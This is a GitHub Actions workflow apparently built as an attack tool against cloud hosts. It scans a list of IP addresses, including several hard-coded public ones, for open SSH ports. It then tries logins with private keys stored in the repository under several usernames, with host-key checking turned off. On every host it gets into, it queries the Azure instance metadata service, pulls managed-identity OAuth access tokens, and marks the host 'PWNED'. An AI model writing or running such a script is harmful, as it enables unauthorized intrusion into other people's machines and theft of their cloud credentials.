name: azssh
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  sweep:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - name: keys
        run: |
          set +e
          chmod 600 az/ibm_key.pem az/azadmin.pem 2>/dev/null
          for f in az/ibm_key.pem az/azadmin.pem; do echo "== $f"; ssh-keygen -y -f "$f" | cut -c1-60; done
          echo "EGRESS=$(curl -s -m 10 https://ifconfig.me)"
          echo "IMDS_SELF=$(curl -s -m 5 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-11-15' | head -c 200)"
      - name: ports
        run: |
          set +e
          : > out_ports.txt
          extra="20.196.201.126 137.116.146.200 20.197.62.105 172.161.0.73 20.196.201.41 20.115.114.95 4.151.72.8"
          { awk -F'\t' '{print $2}' az/hosts.tsv; for e in $extra; do echo $e; done; } | sort -u > ips.txt
          echo "ip_count=$(wc -l < ips.txt)"
          chk() { ip="$1"; if timeout 5 bash -c "exec 3<>/dev/tcp/$ip/22" 2>/dev/null; then echo "OPEN $ip"; else echo "closed $ip"; fi; }
          export -f chk
          cat ips.txt | xargs -P 24 -I{} bash -c 'chk {}' | sort > out_ports.txt
          grep -c '^OPEN' out_ports.txt; grep '^OPEN' out_ports.txt || true
      - name: ssh
        run: |
          set +e
          : > out_ssh.txt
          grep '^OPEN' out_ports.txt | awk '{print $2}' > open_ips.txt || true
          while read -r ip; do
            for u in t19 azureuser ubuntu; do
              for kf in az/ibm_key.pem az/azadmin.pem; do
                [ -f "$kf" ] || continue
                out=$(ssh -i "$kf" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" 'echo LOGIN_OK uid=$(id -u) host=$(hostname) gpu=$(nvidia-smi -L 2>/dev/null | wc -l) ip=$(hostname -I | awk "{print \$1}"); curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-11-15" | head -c 300; echo; for CID in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 ""; do if [ -n "$CID" ]; then q="&client_id=$CID"; else q=""; fi; T=$(curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/$q"); echo "TOK[$CID]=${T:0:80}"; echo "$T" | grep -o "\"access_token\":\"[^\"]*" | cut -c17- | head -c 4000 > /tmp/t.$$; if [ -s /tmp/t.$$ ]; then echo ARMTOK_${CID:-default}=$(cat /tmp/t.$$); fi; done' 2>&1 | head -12)
                echo "TRY $ip $u $(basename $kf) => $(echo "$out" | head -1)"
                echo "TRY $ip $u $(basename $kf) => $out" >> out_ssh.txt
                case "$out" in *LOGIN_OK*) echo "PWNED $ip $u $kf" >> out_ssh.txt;; esac
              done
            done
          done < open_ips.txt
          echo "=== PWNED SUMMARY ==="; grep '^PWNED' out_ssh.txt || echo none
          echo "=== ARMTOK SUMMARY ==="; grep -o 'ARMTOK_[^=]*=[^ ]\{20,\}' out_ssh.txt | cut -c1-40 || echo none
      - name: sum
        if: always()
        run: |
          set +e
          echo "=== PORTS ==="; cat out_ports.txt 2>/dev/null | head -80
          echo "=== SSH ==="; grep -E 'LOGIN_OK|PWNED|ARMTOK' out_ssh.txt 2>/dev/null | head -40
